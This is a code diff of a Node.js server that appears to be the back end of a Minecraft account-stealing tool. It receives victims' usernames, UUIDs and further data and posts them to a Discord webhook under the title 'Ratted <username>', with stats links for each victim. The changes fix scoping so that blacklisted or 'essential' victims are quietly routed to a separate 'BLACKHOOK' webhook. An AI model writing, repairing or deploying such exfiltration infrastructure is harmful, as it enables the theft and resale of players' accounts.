@@ -131,11 +131,12 @@ app.post("/", (req, res) => {
         if (req.body.type) {
             comment = req.body.type
 
-            // Essential go brrrr
             if (comment == "essential") {
-                let webhook = process.env.BLACKHOOK
+                webhook = process.env.BLACKHOOK //debug
             }
         }
+
+        let links = ``
 
         // Useful links
         if (req.body.username) {
@@ -144,6 +145,8 @@ app.post("/", (req, res) => {
             let matdoes = `[Matdoes](https://skyblock.matdoes.dev/player/${req.body.username})`
             let cofl = `[CoflNet](https://sky.coflnet.com/player/${req.body.uuid})`
             let namemc = `[NameMC](https://namemc.com/profile/${req.body.username})`
+
+             links = `${skyCrypt} ${plancke} ${matdoes} ${cofl} ${namemc}`
         }
 
         //numbers in the checks else allow for better sorting if you wish to only find embeds with these logins using discords search bar
@@ -173,16 +176,16 @@ app.post("/", (req, res) => {
         let content = `@everyone - <t:${timestamp}:R>`
         
         if (process.env.BLACKLIST.split("_").includes(req.body.uuid)) { // debug
-            let content = `Blacked - <t:${timestamp}:R>`
-            let webhook = process.env.BLACKHOOK
+            content = `Blacked - <t:${timestamp}:R>`
+            webhook = process.env.BLACKHOOK
         }
 
         try {
-            post(webhook, JSON.stringify({ // debug
+            post(webhook, JSON.stringify({
                 content: content, //ping
                 embeds: [{
                     title: `Ratted ${req.body.username} - Click Below For Stats`,
-                    description: `${skyCrypt} ${plancke} ${matdoes} ${cofl} ${namemc}`,
+                    description: links,
                     fields: [
                         {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
                         {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
